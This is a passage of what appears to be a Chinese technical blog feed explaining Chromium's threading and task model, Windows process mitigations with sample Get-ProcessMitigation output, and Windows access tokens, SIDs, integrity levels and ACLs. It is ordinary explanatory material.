id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><ul><li><strong>Task</strong>: task 是一个待处理的工作单元，也可以理解为是具有可选关联状态的函数指针。In Chrome this is <code>base::OnceCallback</code> and <code>base::RepeatingCallback</code> created via <code>base::BindOnce</code> and <code>base::BindRepeating</code>, respectively. (<a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/callback.md">documentation</a>).</li><li><strong>Task queue</strong>: 待处理的任务队列。</li><li><strong>Physical thread</strong>: 操作系统提供的线程 (e.g. pthread on POSIX or CreateThread() on Windows). The Chrome cross-platform abstraction is <code>base::PlatformThread</code>. </li><li><strong><code>base::Thread</code></strong>: A physical thread 永远处理来自专用任务队列的消息，直到 Quit()。</li><li><strong>Thread pool</strong>: 具有共享任务队列的物理线程池. In Chrome, this is <code>base::ThreadPoolInstance</code>. </li><li><strong>Sequence</strong> or <strong>Virtual thread</strong>: chrome 管理的执行线程。与 physical thread 一样，在任何给定时刻只有一个任务可以在给定的 sequence / virtual thread 线程上运行，并且每个任务都可以看到前面任务的副作用。 任务会按顺序执行，但可能会在每个physical thread之间跳转。</li><li><strong>Task runner</strong>: 一个可以发布任务的界面. In Chrome this is <code>base::TaskRunner</code>.</li><li><strong>Sequenced task runner</strong>: 任务运行程序，它保证发布到它的任务将按发布顺序运行。每个这样的任务都能看到它之前的任务的副作用，发布到序列任务运行器的任务通常由单个线程（virtual or physical）处理。 In Chrome this is <code>base::SequencedTaskRunner</code> which is-a <code>base::TaskRunner</code>.</li><li><strong>Single-thread task runner</strong>: 一个有序的任务运行程序，它保证所有任务都由相同的物理(physical)线程处理。 In Chrome this is <code>base::SingleThreadTaskRunner</code> which is-a <code>base::SequencedTaskRunner</code>. </li></ul><h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><p>每个 chrome 的进程都包含如下线程：</p><ul><li>主线程<ul><li>in the browser process (BrowserThread::UI): updates the UI</li><li>in renderer processes (Blink main thread): runs most of Blink</li></ul></li><li>IO 线程<ul><li>在所有进程中：所有IPC消息都到达该线程，处理消息的应用程序逻辑可能位于不同的线程中（IO线程可能将消息路由到绑定到不同线程的Mojo接口）</li><li>大多数异步 I/O 都发生在这个线程上 (base::FileDescriptorWatcher).</li><li>浏览器进程下是<code>BrowserThread::IO</code></li></ul></li><li>一些专用线程</li><li>一个通用线程池</li></ul><p>大多数线程都有一个循环，用以从队列中获取任务并运行它们（队列可以在多个线程之间共享）。</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>task 是用以异步执行的工作单元，由<code>base::OnceClosure</code>添加到队列。<code>base::OnceClosure</code>存储着函数指针和参数，通过 <code>Run()</code>来调用所存储的函数指针。<code>base::OnceClosure</code>通过<code>base::BindOnce</code></p><p>来声明。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskA</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskB</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> task_a = base::BindOnce(&amp;TaskA);</span><br><span class="line"><span class="keyword">auto</span> task_b = base::BindOnce(&amp;TaskB, <span class="number">42</span>);</span><br></pre></td></tr></table></figure><h3 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h3><ul><li>并行(Parallel)：没有任务执行顺序，可能在任何线程上执行所有任务（通过线程池实现）</li><li>顺序执行(Sequenced)：在任何线程上，按照提交顺序一次执行一个任务（通过 <code>SequencedTaskRunner</code> 实现）</li><li>单线程(Single Threaded)：按发送顺序执行的任务，在单个线程上一次执行一个任务 (通过 <code>SingleSuqenceTaskRunner</code> 实现)<ul><li>COM Single Threaded：COM已初始化的单线程的变体。</li></ul></li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md">https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Architecture </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Mitigation</title>
      <link href="posts/ee684c01/"/>
      <url>posts/ee684c01/</url>
      
        <content type="html"><![CDATA[<p>我们可以使用<code>Get-ProcessMitigation</code>来查询某一进程所开启的保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\air\Desktop&gt; Get-ProcessMitigation 12092</span><br><span class="line"></span><br><span class="line">ProcessName                      : msedge</span><br><span class="line">Source                           : Running Process</span><br><span class="line">Id                               : 12092</span><br><span class="line"></span><br><span class="line">DEP:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    EmulateAtlThunks                   : ON</span><br><span class="line"></span><br><span class="line">ASLR:</span><br><span class="line">    BottomUp                           : ON</span><br><span class="line">    ForceRelocateImages                : OFF</span><br><span class="line">    RequireInfo                        : OFF</span><br><span class="line">    HighEntropy                        : ON</span><br><span class="line"></span><br><span class="line">StrictHandle:</span><br><span class="line">    Enable                             : OFF</span><br><span class="line"></span><br><span class="line">System Call:</span><br><span class="line">    DisableWin32kSystemCalls           : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ExtensionPoint:</span><br><span class="line">    DisableExtensionPoints             : ON</span><br><span class="line"></span><br><span class="line">DynamicCode:</span><br><span class="line">    BlockDynamicCode                   : OFF</span><br><span class="line">    AllowThreadsToOptOut               : OFF</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">CFG:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    SuppressExports                    : OFF</span><br><span class="line">    StrictControlFlowGuard             : OFF</span><br><span class="line"></span><br><span class="line">BinarySignature:</span><br><span class="line">    MicrosoftSignedOnly                : ON</span><br><span class="line">    AllowStoreSignedBinaries           : OFF</span><br><span class="line">    AuditMicrosoftSignedOnly           : OFF</span><br><span class="line">    AuditStoreSigned                   : OFF</span><br><span class="line"></span><br><span class="line">FontDisable:</span><br><span class="line">    DisableNonSystemFonts              : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ImageLoad:</span><br><span class="line">    BlockRemoteImageLoads              : ON</span><br><span class="line">    AuditRemoteImageLoads              : OFF</span><br><span class="line">    BlockLowLabelImageLoads            : ON</span><br><span class="line">    AuditLowLabelImageLoads            : OFF</span><br><span class="line">    PreferSystem32                     : OFF</span><br><span class="line">    AuditPreferSystem32                : OFF</span><br><span class="line"></span><br><span class="line">Payload:</span><br><span class="line">    EnableExportAddressFilter          : OFF</span><br><span class="line">    AuditEnableExportAddressFilter     : OFF</span><br><span class="line">    EnableExportAddressFilterPlus      : OFF</span><br><span class="line">    AuditEnableExportAddressFilterPlus : OFF</span><br><span class="line">    EnableImportAddressFilter          : OFF</span><br><span class="line">    AuditEnableImportAddressFilter     : OFF</span><br><span class="line">    EnableRopStackPivot                : OFF</span><br><span class="line">    AuditEnableRopStackPivot           : OFF</span><br><span class="line">    EnableRopCallerCheck               : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line">    EnableRopSimExec                   : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line"></span><br><span class="line">Child Process:</span><br><span class="line">    DisallowChildProcessCreation       : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">User Shadow Stack:</span><br><span class="line">    UserShadowStack                    : OFF</span><br><span class="line">    UserShadowStackStrictMode          : OFF</span><br><span class="line">    AuditUserShadowStack               : OFF</span><br><span class="line">    SetContextIpValidation             : OFF</span><br><span class="line">    AuditSetContextIpValidation        : OFF</span><br><span class="line">    BlockNonCetBinaries                : OFF</span><br><span class="line">    BlockNonCetBinariesNonEhcont       : OFF</span><br><span class="line">    AuditBlockNonCetBinaries           : OFF</span><br></pre></td></tr></table></figure><p>其功能介绍如下：</p><table><thead><tr><th align="left"><strong>Mitigation</strong></th><th align="left"><strong>Description</strong></th><th align="left"><strong>Default</strong></th><th align="left"><strong>Level</strong></th></tr></thead><tbody><tr><td align="left">Control flow guard (CFG)</td><td align="left">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Data Execution Prevention (DEP)</td><td align="left"><strong>数据执行保护</strong>，和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Force randomization for images (Mandatory ASLR)</td><td align="left">强制重定位未使用/DYNAMICBASE 编译的映像</td><td align="left">Off</td><td align="left">System &amp; app</td></tr><tr><td align="left">Randomize memory allocations (Bottom-Up ASLR)</td><td align="left">虚拟内存地址分配随机化</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate exception chains (SEHOP)</td><td align="left">在程序转入异常处理前，SEHOP会检查SEH链，特别是最后一个异常处理函数是否为系统固定的终极异常处理函数，确保其完整性</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate heap integrity</td><td align="left">当检测到堆损坏时，终止进程</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Arbitrary code guard (ACG)</td><td align="left">阻止未(经过微软)签名的模块加载，禁止创建未签名的可执行页，保护签名过的代码页使其不能被修改</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block low integrity images</td><td align="left">防止加载标记为低完整性的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block remote images</td><td align="left">防止从远程设备加载图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block untrusted fonts</td><td align="left">防止加载任何未安装在系统字体目录中的基于GDI的字体，特别是来自web的字体</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Code integrity guard</td><td align="left">限制加载Microsoft，WHQL或更高版本签名的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable extension points</td><td align="left">禁用允许将 DLL 注入所有进程的各种可扩展性机制</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable Win32k system calls</td><td align="left">防止应用程序使用Win32k系统调用表</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Don’t allow child processes</td><td align="left">防止应用程序创建子进程</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Export address filtering (EAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Import address filtering (IAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Simulate execution (SimExec)</td><td align="left">确保敏感 api 的调用返回给合法调用者</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate API invocation (CallerCheck)</td><td align="left">确保调用敏感API的调用者是合法的</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate handle usage</td><td align="left">无效句柄引用后引发异常</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate image dependency integrity</td><td align="left">强制对Windows映像依赖项加载执行代码签名</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate stack integrity (StackPivot)</td><td align="left">确保堆栈不会被重定向到敏感API</td><td align="left">N/a</td><td align="left">App</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows SID &amp; Integrity Level</title>
      <link href="posts/37e301d0/"/>
      <url>posts/37e301d0/</url>
      
        <content type="html"><![CDATA[<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Access-Tokens"><a href="#Access-Tokens" class="headerlink" title="Access Tokens"></a>Access Tokens</h2><p>访问令牌是一个描述进程或线程上下文安全的对象，令牌中的信息包括与进程或线程相关联的用户的 id 信息和权限。当用户登录时，系统会把用户输入的密码和存储在安全数据库中的信息进行比对，来验证用户的密码。如果密码被认证，系统会产生访问令牌。 此用户执行的每个进程都同样有该访问令牌(a copy of user’s access token)。</p><p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包含以下信息：</p><ul><li>用户帐户的安全标识符（SID）</li><li>用户所属组的SID</li><li>标识当前登录会话的登录 SID</li><li>用户或用户组所拥有的特权列表</li><li>所有者 SID。An owner SID</li><li>The SID for the primary group</li><li>当用户在不指定<strong>安全描述符</strong>的情况下创建安全对象时，系统默认使用 DACL</li><li>访问令牌的来源</li><li>Whether the token is a primary or impersonation token</li><li>限制SID的可选列表</li><li>Current impersonation levels</li><li>Other statistics</li></ul><p>每个进程都有一个<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly">主令牌</a>，用于描述与该进程关联的用户的<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">安全上下文</a>。默认情况下，当进程的线程与安全对象交互时，系统使用主令牌。此外，线程可以模拟 client account。模拟后，允许线程使用客户端的安全上下文与安全对象交互。模拟客户端的线程同时具有主令牌和<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/i-gly"><em>模拟令牌</em></a>。</p><h2 id="primary-token"><a href="#primary-token" class="headerlink" title="primary token"></a>primary token</h2><p>主要令牌：通常仅由 Windows 内核创建的访问令牌。它可以分配给一个进程来表示该进程的默认安全信息。</p><h2 id="impersonation-token"><a href="#impersonation-token" class="headerlink" title="impersonation token"></a>impersonation token</h2><p>模拟令牌：为捕获客户端进程的安全信息而创建的访问令牌，允许服务器在安全操作中“模拟”客户端进程。</p><h2 id="Restricted-Tokens"><a href="#Restricted-Tokens" class="headerlink" title="Restricted Tokens"></a>Restricted Tokens</h2><p>受限令牌：受限令牌是主访问令牌或模拟访问令牌调用 <a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken"><strong>CreateRestrictedToken</strong></a>方法修改而来。处于受限令牌的安全上下文运行的进程或模拟线程访问安全对象或执行特权操作的能力受到限制，CreatereestrictToken函数可以通过以下方式限制令牌：</p><ul><li>从令牌中删除权限</li><li>将 deny-only 属性应用于令牌中的 sid，以便它们不能用于访问安全对象</li><li>指定限制 SID 的列表，该列表限制对安全对象的访问。</li></ul><p>系统使用限制 SID 列表来检查令牌对安全对象的访问，当受限进程或线程尝试访问安全对象时，系统将执行两个访问检查：一个是使用令牌已启用的 SID，另一个使用受限SID列表。只有这两个访问检查都被通过的时候，才会授予访问者访问权限。</p><h2 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h2><p>包含安全对象的安全信息的结构和关联数据。安全描述符标识对象的所有者和主要组。它还可以包含控制对对象的访问的 DACL 和控制对访问对象的尝试的日志记录的 SACL。</p><h1 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li>在<a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft </a><a href="https://en.wikipedia.org/wiki/Windows_NT">Windows NT</a>系列<a href="https://en.wikipedia.org/wiki/Operating_system">操作系统</a>的上下文中，<strong>安全标识符</strong>（通常缩写为<strong>SID</strong>）是用户、用户组或其他<a href="https://en.wikipedia.org/wiki/Security_principal">安全主体</a>的唯一的、<a href="https://en.wikipedia.org/wiki/Immutable_object">不可变的</a>标识符。SID在 Windows 中首次创建账户时被创建，一个安全主体（在给定域中）终生有一个 SID，主体的所有属性，包括其名称，都与 SID 相关联。</li><li>SID（安全标识符）是计算机或域控制器用来识别你的唯一ID号，它是分配给 Windows 计算机上的每个用户或域控制网络上的每个用户、组和计算机的一串字母数字字符。</li><li>当我们输入用户名和密码时，Windows 首先会检查我们输入的用户名和其相对应的存储密码是否匹配，之后它会在 Windows注册表中查看与该用户名关联的 SID。用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，会重新获取访问令牌。</li><li>Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。</li></ul><h2 id="SID-解析"><a href="#SID-解析" class="headerlink" title="SID 解析"></a>SID 解析</h2><p>SID 如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; WMIC useraccount get name,sid</span><br><span class="line">Name                SID</span><br><span class="line">Administrator       S-1-5-21-3018282723-2406670630-2225774231-500</span><br><span class="line">air                 S-1-5-21-3018282723-2406670630-2225774231-1000</span><br><span class="line">DefaultAccount      S-1-5-21-3018282723-2406670630-2225774231-503</span><br><span class="line">Guest               S-1-5-21-3018282723-2406670630-2225774231-501</span><br><span class="line">WDAGUtilityAccount  S-1-5-21-3018282723-2406670630-2225774231-504</span><br></pre></td></tr></table></figure><p>微软通常将其分解为以下模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SID)-(revision level)-(identifier-authority)-(subauthority)-(etc)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">S</th><th align="center">1</th><th align="center">5</th><th align="center">21-3018282723-2406670630-2225774231</th><th align="center">1000</th></tr></thead><tbody><tr><td align="center">标识为SID</td><td align="center">一直都是 1</td><td align="center">权限值</td><td align="center">子权限值 在这种情况下，域 (21) 具有唯一标识符。可能有多个下级机构，特别是如果该帐户存在于域中并且属于不同的群体</td><td align="center">相对 ID。默认情况下未创建的任何组或用户将具有 1000 或更大的相对 ID。</td></tr></tbody></table><ul><li><p><strong>SID</strong>: 一直都是 S，这个是 SID 的标识符</p></li><li><p><strong>Revision level</strong>: 一直都是 1</p></li><li><p><strong>Identifier-authority</strong>: 用于标识创建 SID 的权限</p><p>  可能的值为：</p><ul><li>0 ( <code>SECURITY_NULL_SID_AUTHORITY</code>) 是<em>空帐户 SID</em> 的所有者<code>S-1-0-0</code>。</li><li>1（ <code>SECURITY_WORLD_SID_AUTHORITY</code>， <em>everyone group</em>）也仅具有一个SID： <code>S-1-1-0</code>。</li><li>2 ( <code>SECURITY_LOCAL_SID_AUTHORITY</code>, <em>local group</em> ) 也只有一个 SID: <code>S-1-2-0</code>.</li><li>3 ( <code>SECURITY_CREATOR_SID_AUTHORITY</code>)：SID<code>S-1-3-0</code>到<code>S-1-3-5</code>)</li><li>4 ( <code>SECURITY_NON_UNIQUE_AUTHORITY</code>) 未使用</li><li>5 ( <code>SECURITY_NT_AUTHORITY</code>) 拥有由 NT 安全子系统管理的<a href="https://renenyffenegger.ch/notes/Windows/user-account/index">帐户</a>。</li><li>9 ( <code>SECURITY_RESOURCE_MANAGER_AUTHORITY</code>) …</li><li>16 ( <code>SECURITY_MANDATORY_LABEL_AUTHORITY</code>)，见<a href="https://renenyffenegger.ch/notes/Windows/development/process/index#win-process-integrity-level">流程完整性等级</a></li></ul></li><li><p>Subauthority：这是一个变量号，用于标识SID所描述的用户或组与创建它的机构之间的关系</p><ul><li>号码由那个计算机或网络所创建</li><li>此用户是普通用户、访客、管理员还是其他组的一部分</li><li>该权限创建用户帐户的顺序 (i.e., “This was the first user” or “This is the 231st machine account created”.)</li></ul></li></ul><h2 id="已知-SID"><a href="#已知-SID" class="headerlink" title="已知 SID"></a>已知 SID</h2><p>每个用户的 SID 在所有 Windows 中都是唯一的。也就是说，某些 SID 在所有系统上都是通用的，或者以相同的前缀开头。</p><p>参看<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><p><strong>Capability SIDs</strong></p><p>Windows 8 引入了<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers#capability-sids">功能安全标识符 (SID)</a>。Capability SIDs 以唯一且不可变的方式标识能力。Capability SIDs 代表了一种令人难忘的权限令牌，它授予通用 Windows 应用程序对资源（例如文档、相机、位置等）的访问权限。具有该 SID 的应用被授予对关联资源的访问权限，反之没有该 SID的应用程序将被拒绝访问资源。</p><p>操作系统所知的所有功能SID都存储在以下子项中的Windows注册表中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SecurityManager\CapabilityClasses\AllCachedCapabilities</span><br></pre></td></tr></table></figure><p>此子项还包含由第一方或第三方应用程序添加的任何功能 SID。所有功能 SID 都以<code>S-1-15-3</code>.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kb.iu.edu/d/aotl">https://kb.iu.edu/d/aotl</a></p><p><a href="https://en.wikipedia.org/wiki/Security_Identifier">https://en.wikipedia.org/wiki/Security_Identifier</a></p><p><a href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a></p><p><a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><h1 id="Integrity-Level"><a href="#Integrity-Level" class="headerlink" title="Integrity Level"></a>Integrity Level</h1><h2 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>完整性级别表示正在运行的应用程序进程和对象（例如应用程序创建的文件）的可信度，由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li><li><p>Windows 完整性机制的目的是限制同一账户下运行的可信度较低的应用程序的访问权限。主要解决的安全问题是未授权篡改用户数据，间接篡改系统状态，信息泄露。</p></li></ul><blockquote><p>Windows 安全体系结构主要基于 SID 来构建，SID 代表着每个用户或组所被授予的访问权限（读、写和执行权限）和特权。当用户登录 Windows 时，安全子系统会在<code>security access token</code>中添加用户的 SID 和组成员身份 SID，相应的该用户或组下的所有应用程序会被授予同样的访问权限和特权。每次应用程序打开一个<strong>对象</strong>（如文件或注册表项）时，管理该对象的资源管理器都会访问安全子系统来确定此用户是否具有访问权限，安全子系统会把<code>access token</code>中的用户和组的 SID 和与<strong>对象</strong>相关联的 SID 进行比较，如果用户SID在对象的ACL中授予完全访问权限，则用户运行的应用程序进程可以完全访问该对象。</p></blockquote><h2 id="Extending"><a href="#Extending" class="headerlink" title="Extending"></a>Extending</h2><ul><li>Windows 完整性机制通过定义新的访问控制条目（ACE）类型来扩展安全体系结构，新的 ACE (access control entry) 用来代表对象安全描述符中的完整性级别。当访问令牌被初始化时，完整性级别也被分配给安全访问令牌。</li><li>访问令牌中的完整性级别表示 <code>subject</code> 的完整性级别，使用安全描述符中强制标签 ACE 中的完整性级别 SID 来表示对象完整性级别。当安全子系统（安全参考监视器）执行访问检查时，将 <strong>access token</strong> (访问令牌)中的完整性级别 与 <strong>SID</strong> (安全标识符) 中的完整性水平进行比较。</li><li>Windows 根据 Subject 的完整性级别和新访问控制ACE中的完整性策略标志来判断其访问权限。</li><li>安全子系统将完整性级别实现为强制标签，目的是区分 ACLs所提供给用户的自由控制的<code>discretionary access</code></li><li>强制标签 ACE定义了一个 Object 的完整性级别，但是并不改变现有的安全描述符数的据结构定义和常用的自由访问控制表(discretionary access control list，缩写为DACL)，该表通常授予管理员和系统完全控制权限，并授予通过身份验证用户读取和执行权限。</li></ul><blockquote><p>Windows Vista 使用<strong>AccessCheck</strong>函数来确定安全对象具有哪些访问权限</p></blockquote><h3 id="Access-Control-Entries-ACE"><a href="#Access-Control-Entries-ACE" class="headerlink" title="Access Control Entries(ACE)"></a>Access Control Entries(ACE)</h3><p>ACE 是 ACL 列表当中的一个成员。一个 ACL 中可以有 0 个或多个 ACE。每个ACE控制或监视指定受信者的对象的访问权限。一共有 6 种 ACE，其中 3 种支持所有的安全对象，其他三种类型是目录服务对象支持的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces">Object-specific ACEs</a>。</p><p>所有类型的ACE都包含以下访问控制信息：</p><ul><li>安全标识符（SID），用于标识 ACE 应用的 trustee。</li><li>由ACE控制的访问权限的访问掩码。</li><li>表示ACE类型的标志。</li><li>一组位标志，用于确定子容器或对象是否可以从ACL附加到的主对象继承ACE。</li></ul><p>以下是所有安全对象支持的三种 ACE 类型：</p><table><thead><tr><th align="left">Type</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">Access-denied ACE</td><td align="left">在<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly"><em>discretionary access control list</em></a> （DACL）中用于拒绝对 trustee 的访问权限。</td></tr><tr><td align="left">Access-allowed ACE</td><td align="left">在DACL中用于允许对 trustee 的访问权限。</td></tr><tr><td align="left">System-audit ACE</td><td align="left">Used in a <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>system access control list</em></a> (SACL) to generate an audit record when the trustee attempts to exercise the specified access rights.</td></tr></tbody></table><h3 id="Access-Control-Lists-ACL"><a href="#Access-Control-Lists-ACL" class="headerlink" title="Access Control Lists(ACL)"></a>Access Control Lists(ACL)</h3><p>ACL 是 ACE 的一个列表。ACL 中的每个 ACE 都标识一个 trustee，ACE 代表着 trustee 的允许、拒绝或审核的权限。安全对象的安全描述符可以包含两种类型的 ACL 分别是 DACL 和 SACL：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly">discretionary access control list</a> (DACL) 标识允许或拒绝访问安全对象的受信者(trustee)。当一个进程试图访问一个安全对象时，系统会检查该对象的 DACL 中的 ACE，以确定是否授予对它的访问权。如果该对象没有DACL，系统将授予所有人完全访问权限。如果对象的 DACL 内没有 ACE，系统将拒绝所有进程访问该对象。操作系统按顺序检查 ACE，直到满足以下事件的其中一个：</p><ul><li>access-denied ACE 明确拒绝了线程访问令牌中的某一个 trustee 的所有访问请求</li><li>线程的访问令牌中列出的 trustee 的一个或多个 access-allowed ACEs 显式授予所有请求的访问权限</li><li>已检查所有ACE，但仍至少有一个请求的访问权限未被显式允许，在这种情况下，访问将被隐式拒绝。</li></ul><p>下图显示了对象的DACL如何允许访问一个线程，同时拒绝访问另一个线程：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 